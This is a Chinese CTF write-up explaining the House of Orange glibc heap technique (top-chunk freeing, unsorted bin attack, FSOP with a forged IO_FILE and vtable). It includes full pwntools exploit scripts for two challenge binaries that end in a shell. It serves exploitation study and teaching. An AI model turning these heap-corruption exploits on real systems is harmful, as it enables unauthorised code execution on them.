# House of orange

阅读量 **295495**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-10-22 11:00:42

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t01166cfaffda828351.jpg)

作者: Alter@星盟

## House of orange

###  1、原理概述

house of orange其实是一个组合漏洞，主要针对于没有free函数的程序。因为没有free函数所以需要通过申请比top chunk
size大的chunk，讲top chunk放到unsorted bin中，然后利用unsorted bin
attack结合FSOP，也就是通过修改IO_list_all劫持到伪造的IO_FILE结构上，从而getshell。

需要注意的是这种方法只适用于libc-2.23及之前的版本，2.23之后的版本增加了vtable check，也有办法绕过，具体参照ex师傅的博客：

<http://blog.eonew.cn/archives/1093#glibc-227>

但是2.27及之后的版本取消了abort刷新流的操作，所以这个方法基本就失效了

###  2、free top chunk

当申请的size大于top chunk的时候，会调用sysmalloc进行分配，这时会分为两种情况：

如果我们申请的size>=mp_.mmap_threshold（0x20000），就会调用mmap分配；

如果没有满足上述条件，就会扩展top chunk，也就是free old top chunk，再重新申请一个top
chunk，但是这个过程中还有两个assert检查：

    
    
    old_top = av->top;
    old_size = chunksize (old_top);
    old_end = (char *) (chunk_at_offset (old_top, old_size));
    
    brk = snd_brk = (char *) (MORECORE_FAILURE);
    
    /*
      If not the first time through, we require old_size to be
      at least MINSIZE and to have prev_inuse set.
     */
    
    assert ((old_top == initial_top (av) && old_size == 0) ||
        ((unsigned long) (old_size) >= MINSIZE &&
         prev_inuse (old_top) &&
         ((unsigned long) old_end & pagemask) == 0));
    
    /* Precondition: not enough current space to satisfy nb request */
    assert ((unsigned long) (old_size) < (unsigned long) (nb + MINSIZE));
    

第一个assert需要top chunk的size满足以下条件：

（1）top chunk size>MINISIZE（0x10），总之就是不能太小

（2）top chunk需要有pre_inuse的标志，也就是最后一位需要是1

（3）old_top+old_size的值是页对齐的

一般来说top
chunk的size都是0x20af1这样子的，我们修改的时候只需要保持最后3个数不变即可，上述例子就是修改为0xaf1，这样就可以满足第一个assert的判断

第二个assert的检查：

（4）top chunk size小于申请的size

一般我们按照上面的方法修改top chunk size，都是<0x1000，所以这里我们申请0x1000就可以满足第二个assert

满足上面两个assetr的条件之后，top chunk就会被free到unsorted bin中，然后重新申请一个top
chunk，此时我们达到了目的，不使用free函数获得一个unsorted bin中的chunk

###  3、FSOP

**（1）FSOP原理**

参照ctfWiki，下面是我对ctfWiki的整理：

由IO_FILE的介绍可知，进程中所有的FILE结构体会通过_chain域构成一个链表，IO_list_all就是作为头结点维护的

FSOP的原理就是劫持IO_list_all的值伪造链表和其中的IO_FILE结构体，主要就是将vtable的值修改为我们伪造了函数指针的fake_FILE地址。但是单纯的伪造数据还不够，需要找到一个机制触发，执行我们伪造的数据。FSOP采用的就是调用IO_flush_all_lockp，这个函数会刷新IO_list_all链表中所有项的文件流，相当于对每个文件流调用了fflush函数，所以对应着也调用了IO_overflow，而这个函数需要通过vtable的函数指针调用。之前我们已经将vtable伪造，所以最终实现控制程序流。

而_IO_flush_all_lockp不需要攻击者手动调用，在一些情况下这个函数会被系统调用：

  * 当libc执行abort流程时
  * 当执行exit函数时
  * 当执行流从main函数返回时

其实在一般情况下，也就是在house of orange的题目中，_IO_flush_all_lockp的调用关系是这样的：

**libc_malloc = > malloc_printerr => **libc_message => abort =>
_IO_flush_all_lockp

ctf-wiki中的示意图如下：

![](https://p0.ssl.qhimg.com/t01700b736d0339293f.png)

在调用_IO_flush_all_lockp的过程中的源代码如下：

    
    
    if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base))
            && _IO_OVERFLOW (fp, EOF) == EOF)
          {
            result = EOF;
         }
    

如果要调用IO_overflow还需要满足以下几个条件：

  * fp->_mode <= 0
  * fp->_IO_write_ptr > fp->_IO_write_base

所以我们需要分配一块可控的内存，一般就是堆上的chunk，用于构造伪造的vtable和_IO_FILE，为了执行IO_overflow，我们需要绕过上面的if判断，假设已知_IO_write_ptr，_IO_write_base，_mode的偏移，这样我们就可以构造相应的数据

所以构造_mode=0，_IO_write_ptr=1，_IO_write_base=0，就可以绕过判断执行overflow

需要注意的是这种方法只适用于libc-2.23及之前的版本，2.23之后的版本增加了vtable check，也有办法绕过，具体参照ex师傅的博客：

<http://blog.eonew.cn/archives/1093#glibc-227>

但是2.27及之后的版本取消了abort刷新流的操作，所以这个方法基本就失效了

**（2）house of orange中FSOP过程**

house of orange的主要过程就是通过unsorted bin attack修改IO_list_all，但是unsorted bin
attack写入的地址不是我们可控的，写入的是main
arena+88，所以需要通过某个中间媒介。我们发现在IO_list_all+0x68的位置是chain域（用于链接FILE结构体链表的指针域），然后又发现main
arena+88+0x68的位置是smallbin中size=0x60的chunk数组，这个smallbin中0x60的数组中的chunk是我们可以构造的，也就是我们是可控的，所以可以在这里伪造fake
file结构体。在house of orange中采用的方法就是将old top
chunk的size修改为0x60这样就会被我们链入smallbin的0x60的数组中，同时在old top chunk中构造fake
file结构体（就是FSOP中的构造方法），通过执行overflow的if判断（IO_write_base=0,IO_write_ptr=1,mode=0），布置好vtable和system函数，令_IO_file_jumps中overflow的函数指针是system函数，/bin/sh参数的话就布置到fake
file结构体的开头，因为调用vtable中函数的时候，会将IO_FILE指针作为函数的参数。

需要注意的是house of orange中由于_mode因随机化有1/2的几率是负数，所以成功几率是1/2.

house of orange中的函数调用流程：

**__libc_malloc** => **malloc_printerr** => **libc_message** => **abort** =>
**_IO_flush_all_lockp**

malloc_printerr是malloc中用来打印错误的函数，所以house of
orange最后getshell的时候前面会有一个报错，显示malloc出错了，这是正常现象，一开始我还以为哪里出问题了，，，

###  4、例题（hitcon-house of orange）

**（1）常规检查**

![](https://p1.ssl.qhimg.com/t012a01220a6a95e811.png)

保护全开

**（2）IDA分析**

有增改查函数，没有free函数

  * build函数

![](https://p4.ssl.qhimg.com/t01cd7894fc4e19fe87.png)

只能使用4次，每次build的时候会申请3次，两次malloc和一次calloc，固定0x20大小的chunk作为标记chunk，calloc的chunk用于记录颜色和价格，中间的malloc会申请我们输入的size的chunk，最大0x1000，用于记录name

  * upgrade函数

![](https://p5.ssl.qhimg.com/t010e72792abf1312d9.png)

只能使用两次，要求我们再次输入length，并且没和build的length进行比较，所以这里存在堆溢出漏洞，最多可以输入0x1000字节数据

  * show函数

![](https://p3.ssl.qhimg.com/t01d81df6646b130a0d.png)

就是将house中的信息打印出来，可以用于泄露地址信息

需要注意的是，这题没有一个堆数组，所有upgrade和show函数都是针对最新添加的那个house操作的

**（3）利用思路**

  * 泄露libc地址

    
    
    add(0x10,'a')
    payload='a'*0x18+p64(0x21)+p32(1)+p32(0x1f)+p64(0)*2+p64(0xfa1)
    edit(len(payload),payload)
    add(0x1000,'a')
    add(0x400,'a')
    show()
    libcbase=u64(ru('\x7f')[-6:].ljust(8,'\x00'))-1601-0x3c4b20
    print hex(libcbase)
    

先申请一个chunk，通过堆溢出修改top chunk的size，然后申请一个0x1000的chunk，将top chunk放入到unsorted
bin中，然后申请一个largebin size的chunk，这样拿到的chunk中就会有main
arena地址和heap的地址，只有申请largebin才有heap地址。

![](https://p4.ssl.qhimg.com/t011e6539ea07948f9f.png)

**_关于这里为什么只有申请largebin chunk切割unsorted bin才有fd_nextsize和bk_nextsize？_**  
主要和malloc切割unsorted bin的机制有关，如果unsorted bin中只有一个chunk且这个chunk是last remainder
chunk，这时我们申请的chunk是smallbin size，如果unsorted bin中的这个chunk大于我们申请的smallbin
size+MINISIZE，这个unsorted bin chunk就会直接被分割出来我们所需的smallbin
chunk，不会被整理到largebin中，所以没有fd_nextsize和bk_nextsize。但是我们如果申请largebin
chunk的话，这个条件就不会满足，然后unsorted bin chunk就会先被整理到largebin中，再分割出一个largebin
chunk给我们。

  * 泄露heap地址

    
    
    edit(0x10,'a'*16)
    #z()
    show()
    rc(0x20)
    heapbase=u64(rc(6).ljust(8,'\x00'))-0xc0
    print hex(heapbase)
    _IO_list_all=libcbase+libc.sym['_IO_list_all']
    system=libcbase+libc.sym['system']
    

由于show函数遇到’\x00’就会停止打印，所以泄露出main arena之后还需要通过edit写入0x10个a，show打印出heap地址

  * FSOP

    
    
    payload='a'*0x400+p64(0)+p64(0x21)+'a'*0x10
    fake_file='/bin/sh\x00'+p64(0x60)
    fake_file+=p64(0)+p64(_IO_list_all-0x10)#unsorted bin attack
    fake_file+=p64(0)+p64(1)#IO_write_ptr>IO_write_base
    fake_file=fake_file.ljust(0xc0,'\x00')#_mode=0
    payload+=fake_file
    payload+=p64(0)*3+p64(heapbase+0x5c8)
    payload+=p64(0)*2+p64(system)
    #z()
    edit(0x800,payload)
    

此时我们有一个0x400的chunk，unsorted bin中还有剩下的top chunk，因为存在堆溢出，所以unsorted
bin中chunk是我们可以控制的，接下来根据FSOP的步骤，需要劫持_IO_list_all，根据上面的解释，我们通过unsorted bin
attack将main arena+88的地址写入到_IO_list_all，同时将old top chunk也就是unsorted
bin中的chunk的size修改为0x60且在old top chunk中布置伪造的IO_FILE，写入之后，old top
chunk就会被链入smallbin的0x60数组中，这个数组的地址正好在伪造的IO_list_all的_chain域，所以old top
chunk此时被放入了IO_FILE结构体链表中。  
上面需要注意的就是/bin/sh的参数问题，/bin/sh参数的话就布置到fake
file结构体的开头，因为调用vtable中函数的时候，会将IO_FILE指针作为函数的参数

查看一下是否IO_FILE结构体是否伪造成功：

![](https://p1.ssl.qhimg.com/t0188be5fd97225b497.png)

发现构造成功，FSOP的条件满足，vtable就是指向我们的堆地址了

再看看vtable指向的IO_file_jumps是否构造成功：

![](https://p2.ssl.qhimg.com/t0194f7c640e3cf6498.png)

发现_overflow函数指针地址处就是system函数地址

![](https://p2.ssl.qhimg.com/t01fd45e69fdf1f653d.png)

我们直接把IO_file_jumps布置到IO_FILE后面了，上图一个是vtable，一个是system函数

  * 触发

    
    
    ru(':')
    sl('1')
    

所以当我们向unsorted bin申请chunk的时候就会触发unsorted bin
attack，修改IO_list_all，然后调用malloc函数，此时会在第一个IO_FILE（_IO_list_all的地址，也就是main
arena那块地址）中看是否满足FSOP的if条件，发现不满足，然后就会跳转到下一个IO_FILE结构体中，也就是smallbin 0x60数组中的old
top
chunk，这里我们之前就已经布置好了伪造的vtable（偏移一般为216，0xd8）指向本身的堆地址，然后在vtable+0x18处（这个位置就是_overflow函数指针的位置）布置system的地址，注意FSOP需要绕过执行_overflow之前的if判断，也就是_mode=0,_IO_write_base=0,_IO_write_ptr=1这几个。  
然后就会按照house of orange的执行流程：

**libc_malloc = > malloc_printerr => **libc_message => abort =>
_IO_flush_all_lockp

**EXP:**

    
    
    from pwn import *
    context(log_level='debug',arch='amd64')
    
    local=1
    binary_name='houseoforange_hitcon_2016'
    if local:
      p=process("./"+binary_name)
      e=ELF("./"+binary_name)
      libc=e.libc
    else:
      p=remote('node3.buuoj.cn',27493)
      e=ELF("./"+binary_name)
      libc=ELF("libc-2.23.so")
    
    def z(a=''):
      if local:
        gdb.attach(p,a)
        if a=='':
          raw_input
      else:
        pass
    ru=lambda x:p.recvuntil(x)
    rc=lambda x:p.recv(x)
    sl=lambda x:p.sendline(x)
    sd=lambda x:p.send(x)
    sla=lambda a,b:p.sendlineafter(a,b)
    ia=lambda : p.interactive()
    
    def add(size,name,price=1,color=1):
      ru("Your choice : ")
      sl('1')
      ru("Length of name :")
      sl(str(size))
      ru("Name :")
      sd(name)
      ru("Price of Orange:")
      sl(str(price))
      ru("Color of Orange:")
      sl(str(color))
    
    def show():
      ru("Your choice : ")
      sl('2')
    
    def edit(size,name,price=1,color=0xddaa):
      ru("Your choice : ")
      sl('3')
      ru("Length of name :")
      sl(str(size))
      ru("Name:")
      sd(name)
      ru("Price of Orange:")
      sl(str(price))
      ru("Color of Orange:")
      sl(str(color))
    
    add(0x10,'a')
    payload='a'*0x18+p64(0x21)+p32(1)+p32(0x1f)+p64(0)*2+p64(0xfa1)
    edit(len(payload),payload)
    add(0x1000,'a')
    add(0x400,'a')
    z()
    show()
    libcbase=u64(ru('\x7f')[-6:].ljust(8,'\x00'))-1601-0x3c4b20
    print hex(libcbase)
    edit(0x10,'a'*16)
    #z()
    show()
    rc(0x20)
    heapbase=u64(rc(6).ljust(8,'\x00'))-0xc0
    print hex(heapbase)
    _IO_list_all=libcbase+libc.sym['_IO_list_all']
    system=libcbase+libc.sym['system']
    
    payload='a'*0x400+p64(0)+p64(0x21)+'a'*0x10
    fake_file='/bin/sh\x00'+p64(0x60)
    fake_file+=p64(0)+p64(_IO_list_all-0x10)#unsorted bin attack
    fake_file+=p64(0)+p64(1)#IO_write_ptr>IO_write_base
    fake_file=fake_file.ljust(0xc0,'\x00')#_mode=0
    payload+=fake_file
    payload+=p64(0)*3+p64(heapbase+0x5c8)
    payload+=p64(0)*2+p64(system)
    #z()
    edit(0x800,payload)
    #z()
    
    ru(':')
    sl('1')
    ia()
    

###  5、例题（Just_a_Galgame）

house of orange的组合漏洞一般只在低于libc-2.27的版本才奏效，但是house of orange中free top
chunk的手法还是可以继续使用的，下面这题就是在libc-2.27的情况下free top chunk的情况。比赛的时候给的提示是house of
orange，但其实和house of orange有关就只有free top chunk

House of orange泄露libc+数组越界漏洞

libc很快就泄露出来了，但是数组越界漏洞一直没看出来，还以为是2.23下house of
orange的组合利用，需要劫持虚表，浪费了好多时间，最后还是没有做出来，看了wp才知道自己傻了，果然逆向的能力需要再提升一下

**1、常规检查**

![](https://p5.ssl.qhimg.com/t010e294c80fac324c5.png)

虽然没有PIE，但是full RELRO，所以无法修改got表

**2、IDA分析**

所有的功能都在main函数里实现了，没有分开成函数写，一个个来看

  * add函数

固定只能申请0x68的chunk，没有什么漏洞

  * edit函数

这个函数非常关键，漏洞都在这里，首先第一眼可以看到read这里存在堆溢出漏洞，因为我们申请的chunk大小固定0x68，可以修改下一个chunk的chunk
head。

然后如果再看得仔细一点会发现，这里对idx的并没有做过多的检查，它只是检查了一下堆指针数组idx的那个位置有没有内容，如果有就可以往里写，没有检查idx是不是小于6，所以这里存在一个数组越界漏洞。

  * addbig函数

就是申请一个0x1000大小的chunk，是用来free top chunk的

  * show函数

将堆中的内容打印出来

  * leave函数

这个函数也很关键，一开始我以为没啥用，之后觉得有用，但是不会用orz。

可以看到这里允许我们向0x4040a0这个地址写入一个8字节的内容，8字节，，，可以写一个地址，然后0x4040a0这个地址有点眼熟，往上看发现，堆指针数组地址是0x404060，两个地址非常接近

**3、利用思路**

首先可以看到没有free函数，所以只能通过free top chunk来达到free的目的，edit函数允许我们修改top
chunk的size，然后又有addbig函数可以申请0x1000的chunk，所以将top chunk放到unsorted
bin的条件全部达成。又提供了show函数，所以我们可以直接泄露libc地址。

接下来就是比较骚的操作了，首先通过leave函数将malloc
hook-0x60的地址写入到0x4040a0的地址中，然后因为edit函数存在数组越界漏洞，所以我们edit（8），0x404060+8*8=0x4040a0，if语句会判断这个地址是否有内容，而我们刚刚通过leave函数已经将malloc
hook-0x60的地址写入0x4040a0，所以if满足，我们可以向malloc hook-0x60+0x60的地址写入内容，将one
gadget写入，在执行add，getshell

**EXP：**

    
    
    from pwn import *
    context.log_level='debug'
    p=process("./Just_a_Galgame")
    #p=remote('123.56.170.202',52114)
    e=ELF("./Just_a_Galgame")
    libc=ELF('libc-2.27.so')
    
    def add():
      p.recvuntil(">> ")
      p.sendline('1')
    
    def edit(idx,content):
      p.recvuntil(">> ")
      p.sendline('2')
      p.recvuntil("idx >> ")
      p.sendline(str(idx))
      p.recvuntil("movie name >> ")
      p.sendline(content)
    
    def addb():
      p.recvuntil(">> ")
      p.sendline('3')
    
    def show(idx):
      p.recvuntil(">> ")
      p.sendline('4')
      p.recvuntil("Reciew your cgs >> \n")
      p.sendline(str(idx))
    
    def leave(content):
      p.recvuntil(">> ")
      p.sendline('5')
      p.recvuntil("\nHotaru: Won't you stay with me for a while? QAQ\n\n")
      p.send(content)
    
    add()#0
    payload=p64(0)+p64(0xd41)
    edit(0,payload)
    addb()
    add()#1
    #gdb.attach(p)
    show(1)
    main_arena=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-1632
    print hex(main_arena)
    libcbase=main_arena-0x3ebc40
    print hex(libcbase)
    one_gadget=libcbase+0x4f3c2
    malloc_hook=libcbase+libc.sym['__malloc_hook']
    leave(p64(malloc_hook-0x60))
    edit(8,p64(one_gadget))
    add()
    p.interactive()
    

参考链接：

<https://www.jianshu.com/p/1e45b785efc1>

<http://blog.eonew.cn/archives/1093#glibc-227>

<https://bbs.pediy.com/thread-222718.htm>

<https://ctf-wiki.github.io/ctf-wiki/>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **星盟安全团队** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/218887](/post/id/218887)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)

 **+1** __8赞

 __收藏

![](https://p3.ssl.qhimg.com/t0194c173898acf47c6.png) 星盟安全团队

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

